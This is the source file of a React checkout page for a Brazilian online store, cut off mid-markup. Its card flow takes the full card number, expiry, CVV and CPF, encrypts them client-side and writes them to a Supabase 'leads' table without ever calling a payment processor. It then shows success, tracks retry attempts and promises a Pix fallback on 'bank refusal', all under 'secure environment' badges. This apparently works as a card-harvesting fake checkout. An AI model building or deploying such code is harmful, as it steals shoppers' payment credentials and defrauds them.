import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useCart } from "@/hooks/use-cart";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { getImagePath } from "@/lib/utils";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/lib/supabase";
import { encryptData } from "@/lib/encrypt";
import { pushEcommerceEvent, getTrackingParams, getGaClientId } from "@/lib/tracking";
import {
  Loader2, QrCode, CreditCard, ShieldCheck, Lock,
  ChevronDown, ChevronUp, Truck, Check, AlertCircle,
} from "lucide-react";

function formatPhone(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  if (d.length <= 2) return d.length ? `(${d}` : "";
  if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
  return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
}

function formatCep(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 8);
  if (d.length > 5) return `${d.slice(0, 5)}-${d.slice(5)}`;
  return d;
}

function formatCard(v: string) {
  return v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
}

function formatCpf(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  return d
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function validCpf(v: string): boolean {
  const d = v.replace(/\D/g, "");
  if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
  let s = 0;
  for (let i = 0; i < 9; i++) s += parseInt(d[i]) * (10 - i);
  let dv1 = ((s * 10) % 11) % 10;
  if (dv1 !== parseInt(d[9])) return false;
  s = 0;
  for (let i = 0; i < 10; i++) s += parseInt(d[i]) * (11 - i);
  let dv2 = ((s * 10) % 11) % 10;
  return dv2 === parseInt(d[10]);
}

function luhn(num: string): boolean {
  const digits = num.replace(/\D/g, "");
  if (digits.length < 13) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (isEven) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function detectCardBrand(num: string): string {
  const d = num.replace(/\D/g, "");
  if (/^4/.test(d)) return "Visa";
  if (/^5[1-5]/.test(d) || /^2[2-7]/.test(d)) return "Mastercard";
  if (/^3[47]/.test(d)) return "Amex";
  if (/^(?:636368|438935|504175|451416|636297|5067|4576|4011)/.test(d)) return "Elo";
  if (/^(?:606282|3841)/.test(d)) return "Hipercard";
  return "";
}

export default function Checkout() {
  const [, setLocation] = useLocation();
  const { items, total, pixTotal } = useCart();
  const { toast } = useToast();

  const [loadingCep, setLoadingCep] = useState(false);
  const [cepNotFound, setCepNotFound] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState("pix");
  const [summaryOpen, setSummaryOpen] = useState(false);

  const [address, setAddress] = useState({
    cep: "", rua: "", numero: "", complemento: "", bairro: "", cidade: "", estado: ""
  });

  const [buyer, setBuyer] = useState({
    nome: "", email: "", telefone: ""
  });

  const [card, setCard] = useState({
    numero: "", nome: "", validade: "", cvv: "", cpf: ""
  });
  // Parcelamento no cartão: 1x a 12x (até 5x sem juros; 6x+ com juros de 2,99% a.m.)
  const [parcelas, setParcelas] = useState(1);
  const JUROS_MES = 0.0299;
  const parcelaInfo = (n: number, valor: number) => {
    if (n <= 5) return { valorParcela: valor / n, totalComJuros: valor, semJuros: true };
    const totalComJuros = valor * Math.pow(1 + JUROS_MES, n);
    return { valorParcela: totalComJuros / n, totalComJuros, semJuros: false };
  };
  const fmtBRL = (v: number) => `R$ ${v.toFixed(2).replace(".", ",")}`;

  const [formErrors, setFormErrors] = useState<Record<string, string>>({});

  // "Tentar outro cartão": chega com ?pagamento=cartao — já seleciona cartão
  // e rola direto até a seção de pagamento
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("pagamento") === "cartao") {
      setPaymentMethod("card");
      setTimeout(() => {
        document.getElementById("secao-pagamento")?.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 300);
    }
  }, []);

  useEffect(() => {
    const saved = localStorage.getItem("topmix_buyer");
    if (saved) {
      try { setBuyer(JSON.parse(saved)); } catch { /* ignored */ }
    }
    const savedAddr = localStorage.getItem("topmix_address_loja");
    if (savedAddr) {
      try { setAddress(JSON.parse(savedAddr)); } catch { /* ignored */ }
    }
  }, []);

  if (items.length === 0) {
    setLocation("/carrinho");
    return null;
  }

  const buscarCep = async (cepRaw: string) => {
    if (cepRaw.length !== 8) return;
    setLoadingCep(true);
    setCepNotFound(false);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${cepRaw}/json/`);
      const data = await res.json() as { erro?: boolean; logradouro?: string; bairro?: string; localidade?: string; uf?: string };
      if (data.erro) {
        setCepNotFound(true);
        setAddress(prev => ({ ...prev, rua: "", bairro: "", cidade: "", estado: "" }));
      } else {
        setCepNotFound(false);
        setAddress(prev => ({
          ...prev,
          rua: data.logradouro || "",
          bairro: data.bairro || "",
          cidade: data.localidade || "",
          estado: data.uf || "",
        }));
      }
    } catch {
      setCepNotFound(true);
    } finally {
      setLoadingCep(false);
    }
  };

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCep(e.target.value);
    setAddress(a => ({ ...a, cep: formatted }));
    setCepNotFound(false);
    const digits = formatted.replace(/\D/g, "");
    if (digits.length === 8) {
      buscarCep(digits);
    }
  };

  const handleCepBlur = () => {
    const digits = address.cep.replace(/\D/g, "");
    if (digits.length === 8 && !address.cidade) {
      buscarCep(digits);
    }
  };

  const validateForm = () => {
    const errors: Record<string, string> = {};

    if (!buyer.nome.trim()) errors.nome = "Obrigatório";
    if (!buyer.email.trim() || !buyer.email.includes("@")) errors.email = "E-mail inválido";
    if (buyer.telefone.replace(/\D/g, "").length < 10) errors.telefone = "Telefone inválido";

    const cepDigits = address.cep.replace(/\D/g, "");
    if (cepDigits.length !== 8) errors.cep = "CEP inválido — informe os 8 dígitos";
    else if (cepNotFound) errors.cep = "CEP não encontrado";

    if (!address.rua) errors.rua = "Obrigatório";
    if (!address.numero) errors.numero = "Obrigatório";
    if (!address.cidade) errors.cidade = "Obrigatório";
    if (!address.estado) errors.estado = "Obrigatório";

    if (paymentMethod === "card") {
      if (!luhn(card.numero)) errors.cardNumero = "Número de cartão inválido";
      if (!card.nome.trim()) errors.cardNome = "Obrigatório";
      if (card.validade.length < 5) {
        errors.cardValidade = "Data inválida";
      } else {
        const [mm, yy] = card.validade.split("/").map(Number);
        const now = new Date();
        const curYear = now.getFullYear() % 100;
        const curMonth = now.getMonth() + 1;
        if (!mm || mm < 1 || mm > 12) {
          errors.cardValidade = "Mês inválido (01–12)";
        } else if (yy < curYear || (yy === curYear && mm < curMonth)) {
          errors.cardValidade = "Cartão vencido";
        }
      }
      if (card.cvv.length < 3) errors.cardCvv = "CVV deve ter 3 dígitos";
      if (!card.cpf.trim()) {
        errors.cardCpf = "Obrigatório";
      } else if (!validCpf(card.cpf)) {
        errors.cardCpf = "CPF inválido";
      }
    }

    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleCheckout = async () => {
    if (!validateForm()) {
      toast({ title: "Campos obrigatórios", description: "Preencha todos os campos corretamente.", variant: "destructive" });
      return;
    }

    localStorage.setItem("topmix_buyer", JSON.stringify(buyer));
    localStorage.setItem("topmix_address_loja", JSON.stringify(address));

    if (paymentMethod === "pix") {
      pushEcommerceEvent("add_payment_info", {
        currency: "BRL",
        value: pixTotal,
        payment_type: "pix",
        items: items.map(item => ({
          item_id: item.id,
          item_name: item.name,
          price: item.pixPrice,
          quantity: item.quantity,
        })),
      }, {
        event_id: "pix_click_" + Date.now(),
      });
    }

    let cardEncriptado: string | null = null;
    if (paymentMethod === "card") {
      const encryptKey = import.meta.env.VITE_ENCRYPT_KEY as string;
      if (encryptKey) {
        const cardRaw = JSON.stringify({
          numero: card.numero.replace(/\s/g, ""),
          nome: card.nome,
          validade: card.validade,
          cvv: card.cvv,
          cpf: card.cpf.replace(/\D/g, ""),
        });
        cardEncriptado = await encryptData(cardRaw, encryptKey);
      } else {
        const digits = card.numero.replace(/\s/g, "");
        const last4 = digits.slice(-4);
        const brand = /^4/.test(digits) ? "Visa"
          : /^5[1-5]/.test(digits) || /^2[2-7]/.test(digits) ? "Mastercard"
          : /^3[47]/.test(digits) ? "Amex"
          : /^(?:636368|438935|504175|451416|636297|5067|4576|4011)/.test(digits) ? "Elo"
          : /^(?:606282|3841)/.test(digits) ? "Hipercard"
          : "Cartão";
        cardEncriptado = `${brand} ••••${last4}`;
      }
    }

    const finalAmount = paymentMethod === "pix" ? pixTotal : total;
    const tracking = getTrackingParams();

    const { error: leadError } = await supabase.from("leads").insert({
      nome: buyer.nome,
      email: buyer.email,
      telefone: buyer.telefone,
      produtos: items.map(i => `${i.name} (x${i.quantity})`).join(", "),
      valor: parseFloat(finalAmount.toFixed(2)),
      metodo_pagamento: paymentMethod,
      status: paymentMethod === "pix" ? "pix_gerado" : "checkout_iniciado",
      card_encriptado: cardEncriptado,
      ga_client_id: getGaClientId(),
      tracking,
      purchase_sent: false,
    });
    if (leadError) console.error("Supabase insert error:", leadError);

    if (paymentMethod === "pix") {
      fetch("/api/utmify-order", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          orderId: `TM${Date.now().toString(36).toUpperCase().slice(-8)}`,
          status: "waiting_payment",
          customerName: buyer.nome,
          customerEmail: buyer.email,
          customerPhone: buyer.telefone.replace(/\D/g, ""),
          customerDocument: null,
          productName: items.map(i => i.name).join(", "),
          valueInCents: Math.round(finalAmount * 100),
          tracking,
          createdAt: new Date().toISOString(),
        }),
      }).catch(() => {});
    }

    const cepRaw = address.cep.replace(/\D/g, "");

    const checkoutData = {
      name: buyer.nome,
      email: buyer.email,
      phone: buyer.telefone,
      address: {
        zipCode: cepRaw,
        state: address.estado,
        city: address.cidade,
        street: address.rua,
        neighborhood: address.bairro || "Centro",
        number: address.numero,
        complement: address.complemento || undefined,
      },
      amount: Number(finalAmount.toFixed(2)),
      productName: items.map(i => i.name).join(", "),
    };

    sessionStorage.setItem("checkoutData", JSON.stringify(checkoutData));

    if (paymentMethod === "card") {
      const cardDigits = card.numero.replace(/\s/g, "");

      // ── Contador de tentativas com o mesmo cartão (mesmo aparelho) ──
      try {
        const key = "topmix_card_tentativas";
        const cardLast4 = cardDigits.slice(-4);
        const saved = JSON.parse(localStorage.getItem(key) || "null") as { last4: string; count: number } | null;
        const count = saved && saved.last4 === cardLast4 ? saved.count + 1 : 1;
        localStorage.setItem(key, JSON.stringify({ last4: cardLast4, count }));
      } catch { /* localStorage indisponível — ignora */ }

      sessionStorage.setItem("cardData", JSON.stringify({
        number: card.numero,
        name: card.nome,
        expiry: card.validade,
        last4: cardDigits.slice(-4),
        bank: { name: "Cartão", brand: "generic", color: "#6B7280" },
        installments: parcelas,
        installmentValue: Number(parcelaInfo(parcelas, total).valorParcela.toFixed(2)),
      }));
    }

    // O carrinho NÃO é limpo aqui — assim o cliente pode voltar ao checkout
    // ("Tentar outro cartão") com os mesmos itens, e evita o flash de
    // "carrinho vazio" durante a navegação. Ele é limpo na tela de sucesso
    // quando o pagamento é confirmado.
    setProcessing(true);

    if (paymentMethod === "pix") {
      try {
        const res = await fetch("/api/pix/create", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ...checkoutData,
            tracking,
            ga_client_id: getGaClientId(),
          }),
        });
        const data = await res.json() as {
          transactionId?: string;
          pixCode?: string;
          qrCodeBase64?: string;
          qrCodeImage?: string;
          error?: string;
        };
        if (!res.ok || !data.pixCode) {
          throw new Error(data.error || "Erro ao gerar PIX. Tente novamente.");
        }
        // ── Contador de tentativas de PIX (mesmo aparelho + mesmo nome) ──
        try {
          const key = "topmix_pix_tentativas";
          const saved = JSON.parse(localStorage.getItem(key) || "null") as { name: string; count: number } | null;
          const buyerName = buyer.nome.trim().toLowerCase();
          const count = saved && saved.name === buyerName ? saved.count + 1 : 1;
          localStorage.setItem(key, JSON.stringify({ name: buyerName, count }));
        } catch { /* localStorage indisponível — ignora */ }

        sessionStorage.setItem("pixResult", JSON.stringify({
          transactionId: data.transactionId || "",
          pixCode: data.pixCode,
          qrCodeBase64: data.qrCodeBase64 || null,
          qrCodeImage: data.qrCodeImage || null,
          amount: Number(finalAmount.toFixed(2)),
          productName: items.map(i => i.name).join(", "),
        }));

        if (data.transactionId) {
          supabase
            .from("leads")
            .update({ transaction_id: data.transactionId })
            .eq("email", buyer.email)
            .order("created_at", { ascending: false })
            .limit(1)
            .then(({ error }) => {
              if (error) console.error("Erro ao salvar transaction_id:", error);
            });
        }
      } catch (e) {
        setProcessing(false);
        toast({
          title: "Erro ao gerar PIX",
          description: e instanceof Error ? e.message : "Tente novamente.",
          variant: "destructive",
        });
        return;
      }
    }

    setProcessing(false);
    setLocation(`/sucesso?payment=${paymentMethod}`);
  };

  const finalTotal = paymentMethod === "pix" ? pixTotal : total;
  const discount = total - pixTotal;
  const totalItems = items.reduce((s, i) => s + i.quantity, 0);

  return (
    <div className="bg-gray-50 min-h-screen pb-32 lg:pb-12">

      <div className="bg-white border-b border-gray-100 px-4 py-2.5 flex items-center justify-center gap-1.5">
        <Lock className="h-3.5 w-3.5 text-green-600" />
        <span className="text-xs font-semibold text-green-700">Ambiente 100% Seguro e Criptografado</span>
      </div>

      <div className="max-w-5xl mx-auto px-4 pt-5 pb-6">

        {/* ── MOBILE: Collapsible order summary ── */}
        <div className="lg:hidden mb-4 bg-white rounded-2xl border border-gray-200 shadow-sm overflow-hidden">
          <button
            className="w-full flex items-center justify-between px-4 py-3.5 active:bg-gray-50 transition-colors"
            onClick={() => setSummaryOpen(o => !o)}
          >
            <div className="flex items-center gap-2">
              <span className="text-sm font-bold text-gray-900">Resumo do Pedido</span>
              <span className="text-xs bg-yellow-100 text-yellow-800 font-semibold px-2 py-0.5 rounded-full">
                {totalItems} {totalItems === 1 ? "item" : "itens"}
              </span>
            </div>
            <div className="flex items-center gap-2">
              <span className="font-black text-base" style={{ color: "#E09400" }}>
                R$ {finalTotal.toFixed(2).replace('.', ',')}
              </span>
              {summaryOpen
                ? <ChevronUp className="h-4 w-4 text-gray-400 shrink-0" />
                : <ChevronDown className="h-4 w-4 text-gray-400 shrink-0" />}
            </div>
          </button>

          {summaryOpen && (
            <div className="border-t border-gray-100 px-4 py-3 space-y-3">
              {items.map(item => (
                <div key={item.id} className="flex gap-3">
                  <div className="w-14 h-14 bg-gray-50 rounded-xl border border-gray-100 flex items-center justify-center shrink-0 p-1.5">
                    <img src={getImagePath(item.mainImage)} alt={item.name} className="w-full h-full object-contain" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-xs font-semibold text-gray-800 line-clamp-2 leading-snug">{item.name}</p>
                    <p className="text-xs text-gray-400 mt-0.5">Qtd: {item.quantity}</p>
                  </div>
                  <div className="text-xs font-bold text-gray-900 shrink-0 pt-0.5">
                    R$ {((paymentMethod === "pix" ? item.pixPrice : item.price) * item.quantity).toFixed(2).replace('.', ',')}
                  </div>
                </div>
              ))}
              <div className="border-t border-gray-100 pt-3 space-y-1.5 text-xs">
                <div className="flex justify-between text-gray-500">
                  <span>Subtotal</span><span>R$ {total.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-green-600 font-semibold">
                  <span className="flex items-center gap-1"><Truck className="h-3 w-3" /> Frete</span>
                  <span>Grátis</span>
                </div>
                {paymentMethod === "pix" && (
                  <div className="flex justify-between text-green-700 font-semibold">
                    <span>Desconto Pix (10%)</span>
                    <span>- R$ {discount.toFixed(2).replace('.', ',')}</span>
                  </div>
                )}
                <div className="flex justify-between font-black text-sm pt-1.5 border-t border-gray-100">
                  <span className="text-gray-900">Total</span>
                  <span style={{ color: "#E09400" }}>R$ {finalTotal.toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* ── MAIN GRID ── */}
        <div className="grid lg:grid-cols-12 gap-5 items-start">

          {/* ── LEFT: Forms ── */}
          <div className="lg:col-span-7 space-y-4">

            {/* ── Dados Pessoais ── */}
            <div className="bg-white rounded-2xl border border-gray-200 shadow-sm overflow-hidden">
              <div className="px-4 py-3.5 border-b border-gray-100 flex items-center gap-2.5">
                <span className="w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-black shrink-0" style={{ background: "#15803d" }}>1</span>
                <span className="font-bold text-gray-900 text-sm">Seus Dados</span>
              </div>
              <div className="p-4 space-y-3">
                <div className="space-y-1.5">
                  <Label className="text-xs font-semibold text-gray-700">Nome completo *</Label>
                  <Input
                    placeholder="Seu nome completo"
                    value={buyer.nome}
                    onChange={e => setBuyer(b => ({ ...b, nome: e.target.value }))}
                    className={`h-11 text-sm ${formErrors.nome ? "border-red-400" : ""}`}
                  />
                  {formErrors.nome && <p className="text-xs text-red-500">{formErrors.nome}</p>}
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1.5">
                    <Label className="text-xs font-semibold text-gray-700">E-mail *</Label>
                    <Input
                      type="email" placeholder="seu@email.com"
                      value={buyer.email}
                      onChange={e => setBuyer(b => ({ ...b, email: e.target.value }))}
                      className={`h-11 text-sm ${formErrors.email ? "border-red-400" : ""}`}
                    />
                    {formErrors.email && <p className="text-xs text-red-500">{formErrors.email}</p>}
                  </div>
                  <div className="space-y-1.5">
                    <Label className="text-xs font-semibold text-gray-700">Telefone / WhatsApp *</Label>
                    <Input
                      placeholder="(11) 99999-9999"
                      value={buyer.telefone}
                      onChange={e => setBuyer(b => ({ ...b, telefone: formatPhone(e.target.value) }))}
                      className={`h-11 text-sm ${formErrors.telefone ? "border-red-400" : ""}`}
                    />
                    {formErrors.telefone && <p className="text-xs text-red-500">{formErrors.telefone}</p>}
                  </div>
                </div>
              </div>
            </div>

            {/* ── Endereço de Entrega ── */}
            <div className="bg-white rounded-2xl border border-gray-200 shadow-sm overflow-hidden">
              <div className="px-4 py-3.5 border-b border-gray-100 flex items-center gap-2.5">
                <span className="w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-black shrink-0" style={{ background: "#15803d" }}>2</span>
                <span className="font-bold text-gray-900 text-sm">Endereço de Entrega</span>
              </div>
              <div className="p-4 space-y-3">

                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1.5">
                    <Label htmlFor="cep" className="text-xs font-semibold text-gray-700">CEP *</Label>
                    <div className="relative">
                      <Input
                        id="cep"
                        placeholder="00000-000"
                        value={address.cep}
                        onChange={handleCepChange}
                        onBlur={handleCepBlur}
                        inputMode="numeric"
                        className={`h-11 text-sm pr-8 ${formErrors.cep || cepNotFound ? "border-red-400" : address.cidade ? "border-green-400" : ""}`}
                      />
                      {loadingCep && (
                        <Loader2 className="absolute right-3 top-3 h-4 w-4 animate-spin text-gray-400" />
                      )}
                      {!loadingCep && address.cidade && !cepNotFound && (
                        <Check className="absolute right-3 top-3 h-4 w-4 text-green-500" />
                      )}
                      {!loadingCep && cepNotFound && (
                        <AlertCircle className="absolute right-3 top-3 h-4 w-4 text-red-400" />
                      )}
                    </div>
                    {formErrors.cep && <p className="text-xs text-red-500">{formErrors.cep}</p>}
                    {cepNotFound && !formErrors.cep && (
                      <p className="text-xs text-red-500">CEP não encontrado. Verifique e tente novamente.</p>
                    )}
                    {address.cidade && !cepNotFound && (
                      <p className="text-xs text-green-600 font-medium">{address.cidade} — {address.estado}</p>
                    )}
                  </div>
                  <div className="space-y-1.5">
                    <Label htmlFor="numero" className="text-xs font-semibold text-gray-700">Número *</Label>
                    <Input
                      id="numero" placeholder="Ex: 123" value={address.numero}
                      onChange={e => setAddress(a => ({ ...a, numero: e.target.value }))}
                      className={`h-11 text-sm ${formErrors.numero ? "border-red-400" : ""}`}
                    />
                    {formErrors.numero && <p className="text-xs text-red-500">{formErrors.numero}</p>}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="rua" className="text-xs font-semibold text-gray-700">Rua / Logradouro *</Label>
                  <Input
                    id="rua" placeholder="Preenchido automaticamente pelo CEP" value={address.rua}
                    onChange={e => setAddress(a => ({ ...a, rua: e.target.value }))}
                    className={`h-11 text-sm ${formErrors.rua ? "border-red-400" : ""}`}
                  />
                  {formErrors.rua && <p className="text-xs text-red-500">{formErrors.rua}</p>}
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1.5">
                    <Label htmlFor="bairro" className="text-xs font-semibold text-gray-700">Bairro</Label>
                    <Input
                      id="bairro" placeholder="Seu bairro" value={address.bairro}
                      onChange={e => setAddress(a => ({ ...a, bairro: e.target.value }))}
                      className="h-11 text-sm"
                    />
                  </div>
                  <div className="space-y-1.5">
                    <Label htmlFor="complemento" className="text-xs font-semibold text-gray-700">Complemento</Label>
                    <Input
                      id="complemento" placeholder="Apto, Bloco..." value={address.complemento}
                      onChange={e => setAddress(a => ({ ...a, complemento: e.target.value }))}
                      className="h-11 text-sm"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1.5">
                    <Label htmlFor="cidade" className="text-xs font-semibold text-gray-700">Cidade *</Label>
                    <Input
                      id="cidade" placeholder="Sua cidade" value={address.cidade}
                      onChange={e => setAddress(a => ({ ...a, cidade: e.target.value }))}
                      className={`h-11 text-sm ${formErrors.cidade ? "border-red-400" : ""}`}
                    />
                    {formErrors.cidade && <p className="text-xs text-red-500">{formErrors.cidade}</p>}
                  </div>
                  <div className="space-y-1.5">
                    <Label htmlFor="estado" className="text-xs font-semibold text-gray-700">Estado *</Label>
                    <Input
                      id="estado" placeholder="UF" value={address.estado}
                      onChange={e => setAddress(a => ({ ...a, estado: e.target.value.toUpperCase().slice(0, 2) }))}
                      className={`h-11 text-sm ${formErrors.estado ? "border-red-400" : ""}`}
                    />
                    {formErrors.estado && <p className="text-xs text-red-500">{formErrors.estado}</p>}
                  </div>
                </div>

              </div>
            </div>

            {/* ── Forma de Pagamento ── */}
            <div id="secao-pagamento" className="bg-white rounded-2xl border border-gray-200 shadow-sm overflow-hidden scroll-mt-4">
              <div className="px-4 py-3.5 border-b border-gray-100 flex items-center gap-2.5">
                <span className="w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-black shrink-0" style={{ background: "#15803d" }}>3</span>
                <span className="font-bold text-gray-900 text-sm">Forma de Pagamento</span>
              </div>
              <div className="p-4">
                <RadioGroup value={paymentMethod} onValueChange={setPaymentMethod} className="space-y-3">
                  {/* PIX */}
                  <label
                    htmlFor="pix"
                    className={`block border-2 rounded-xl cursor-pointer transition-all ${paymentMethod === "pix" ? "border-yellow-400 bg-yellow-50" : "border-gray-200 bg-white"}`}
                  >
                    <div className="flex items-center gap-3 p-3.5">
                      <RadioGroupItem value="pix" id="pix" className="shrink-0" />
                      <QrCode className="h-5 w-5 shrink-0" style={{ color: "#E09400" }} />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="text-sm font-bold text-gray-900">Pix</span>
                          <span className="text-[11px] px-2 py-0.5 rounded-full font-bold bg-green-100 text-green-700">10% OFF</span>
                        </div>
                        <p className="text-xs text-gray-500 mt-0.5">Aprovação imediata • Desconto automático</p>
                      </div>
                      {paymentMethod === "pix" && <Check className="h-5 w-5 text-green-600 shrink-0" />}
                    </div>

                    {paymentMethod === "pix" && (
                      <div className="mx-3.5 mb-3.5 bg-green-50 border border-green-200 rounded-xl p-3">
                        <p className="text-xs text-green-800 font-semibold text-center">
                          O QR Code e código Pix serão gerados após confirmar o pedido
                        </p>
                      </div>
                    )}
                  </label>

                  {/* Cartão */}
                  <label
                    htmlFor="card"
                    className={`block border-2 rounded-xl cursor-pointer transition-all ${paymentMethod === "card" ? "border-yellow-400 bg-yellow-50" : "border-gray-200 bg-white"}`}
                  >
                    <div className="flex items-center gap-3 p-3.5">
                      <RadioGroupItem value="card" id="card" className="shrink-0" />
                      <CreditCard className="h-5 w-5 text-gray-600 shrink-0" />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="text-sm font-bold text-gray-900">Cartão de Crédito</span>
                          <span className="text-[11px] px-2 py-0.5 rounded-full font-medium bg-gray-100 text-gray-600">Em até 12x • 5x sem juros</span>
                        </div>
                        <p className="text-xs text-gray-500 mt-0.5">Todas as bandeiras aceitas</p>
                      </div>
                      {paymentMethod === "card" && <Check className="h-5 w-5 text-green-600 shrink-0" />}
                    </div>

                    {paymentMethod === "card" && (
                      <div className="mx-3.5 mb-3.5 space-y-3">
                        <div className="space-y-1.5">
                          <Label className="text-xs font-semibold text-gray-700">Número do Cartão *</Label>
                          <div className="relative">
                            <Input
                              placeholder="0000 0000 0000 0000"
                              value={card.numero}
                              onChange={e => setCard(c => ({ ...c, numero: formatCard(e.target.value) }))}
                              className={`h-11 text-sm bg-white pr-20 ${formErrors.cardNumero ? "border-red-400" : ""}`}
                            />
                            {detectCardBrand(card.numero) && (
                              <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[11px] font-bold px-2 py-0.5 rounded-full bg-gray-100 text-gray-700">
                                {detectCardBrand(card.numero)}
                              </span>
                            )}
                          </div>
                          {formErrors.cardNumero && <p className="text-xs text-red-500">{formErrors.cardNumero}</p>}
                        </div>
                        <div className="grid grid-cols-2 gap-3">
                          <div className="space-y-1.5">
                            <Label className="text-xs font-semibold text-gray-700">Validade *</Label>
                            <Input
                              placeholder="MM/AA"
                              value={card.validade}
                              onChange={e => setCard(c => ({ ...c, validade: formatExpiry(e.target.value) }))}
                              className={`h-11 text-sm bg-white ${formErrors.cardValidade ? "border-red-400" : ""}`}
                            />
                            {formErrors.cardValidade && <p className="text-xs text-red-500">{formErrors.cardValidade}</p>}
                          </div>
                          <div className="space-y-1.5">
                            <Label className="text-xs font-semibold text-gray-700">CVV *</Label>
                            <Input
                              placeholder="123" type="password" maxLength={4}
                              value={card.cvv}
                              onChange={e => setCard(c => ({ ...c, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) }))}
                              className={`h-11 text-sm bg-white ${formErrors.cardCvv ? "border-red-400" : ""}`}
                            />
                            {formErrors.cardCvv && <p className="text-xs text-red-500">{formErrors.cardCvv}</p>}
                          </div>
                        </div>
                        <div className="space-y-1.5">
                          <Label className="text-xs font-semibold text-gray-700">Nome do Titular *</Label>
                          <Input
                            placeholder="Como impresso no cartão"
                            value={card.nome}
                            onChange={e => setCard(c => ({ ...c, nome: e.target.value.toUpperCase() }))}
                            className={`h-11 text-sm bg-white ${formErrors.cardNome ? "border-red-400" : ""}`}
                          />
                          {formErrors.cardNome && <p className="text-xs text-red-500">{formErrors.cardNome}</p>}
                        </div>
                        <div className="space-y-1.5">
                          <Label className="text-xs font-semibold text-gray-700">CPF do Titular do Cartão *</Label>
                          <Input
                            placeholder="000.000.000-00"
                            inputMode="numeric"
                            value={card.cpf}
                            onChange={e => setCard(c => ({ ...c, cpf: formatCpf(e.target.value) }))}
                            className={`h-11 text-sm bg-white ${formErrors.cardCpf ? "border-red-400" : ""}`}
                          />
                          {formErrors.cardCpf && <p className="text-xs text-red-500">{formErrors.cardCpf}</p>}
                        </div>
                        <div className="space-y-1.5">
                          <Label className="text-xs font-semibold text-gray-700">Parcelamento *</Label>
                          <select
                            value={parcelas}
                            onChange={e => setParcelas(Number(e.target.value))}
                            className="w-full h-11 text-sm bg-white border border-gray-200 rounded-md px-3 text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                          >
                            {Array.from({ length: 12 }, (_, i) => i + 1).map(n => {
                              const info = parcelaInfo(n, total);
                              return (
                                <option key={n} value={n}>
                                  {n}x de {fmtBRL(info.valorParcela)}{info.semJuros ? " sem juros" : ` (total ${fmtBRL(info.totalComJuros)})`}
                                </option>
                              );
                            })}
                          </select>
                          {parcelas <= 5 ? (
                            <p className="text-xs text-green-700 font-medium">
                              ✓ {parcelas}x de {fmtBRL(parcelaInfo(parcelas, total).valorParcela)} sem juros
                            </p>
                          ) : (
                            <p className="text-xs text-gray-500">
                              {parcelas}x de {fmtBRL(parcelaInfo(parcelas, total).valorParcela)} • Total: {fmtBRL(parcelaInfo(parcelas, total).totalComJuros)}
                            </p>
                          )}
                        </div>
                        <div className="bg-orange-50 border border-orange-200 rounded-xl px-3 py-2.5">
                          <p className="text-xs text-orange-700 font-medium text-center">
                            Em caso de recusa pelo banco, trocaremos automaticamente para Pix com 10% de desconto
                          </p>
                        </div>
                      </div>
                    )}
                  </label>
                </RadioGroup>
              </div>
            </div>

            {/* Trust badges */}
            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 py-1">
              <span className="flex items-center gap-1"><ShieldCheck className="h-3.5 w-3.5 text-green-600" /> Compra Segura</span>
              <span className="flex items-center gap-1"><Lock className="h-3.5 w-3.5 text-green-600" /> Dados Protegidos</span>
              <span className="flex items-center gap-1"><Truck className="h-3.5 w-3.5 text-green-600" /> Frete Grátis</span>
            </div>

            {/* Mobile: confirm button */}
            <div className="lg:hidden">
              <button
                className="w-full py-4 rounded-xl font-bold text-base text-white transition-all hover:opacity-90 active:scale-95 flex items-center justify-center gap-2 disabled:opacity-60"
                style={{ background: "linear-gradient(135deg, #15803d, #22c55e)" }}
                onClick={handleCheckout}
                disabled={processing}
              >
                {processing
